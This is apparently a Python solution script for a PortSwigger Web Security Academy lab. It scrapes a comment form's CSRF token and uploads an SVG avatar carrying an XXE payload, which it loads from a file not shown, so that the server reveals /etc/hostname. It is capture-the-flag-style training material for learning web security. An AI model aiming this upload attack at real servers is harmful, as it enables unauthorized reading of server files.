#!/usr/bin/env python


'''This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.
To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

Lab link: https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
'''

import requests
from bs4 import BeautifulSoup

s = requests.session()

lab_id = '0a76006d0401e22d80afb700000e003c' #change based on generated lab

# extract csrf token (using the first post as an example)
uri = f"https://{lab_id}.web-security-academy.net/post?postId=1"
r = s.get(uri) 
soup = BeautifulSoup(r.text, 'lxml')
token = soup.find('input', {'name': 'csrf'})['value'] #comment csrf token

# build out the file upload with the XXE payload
files = {'avatar': open('hacked.svg', 'rb')}
data = {'postId': 1, 'csrf': token, 'name': 'guy', 'email' : 'guy@site.com', 'comment': "hacked"}

uri = f"https://{lab_id}.web-security-academy.net/post/comment"
r2 = s.post(uri, files=files, data=data)
if "has been submitted" in r2.text:
    print("Upload sucessful, load up blog post and view image to finish solving lab")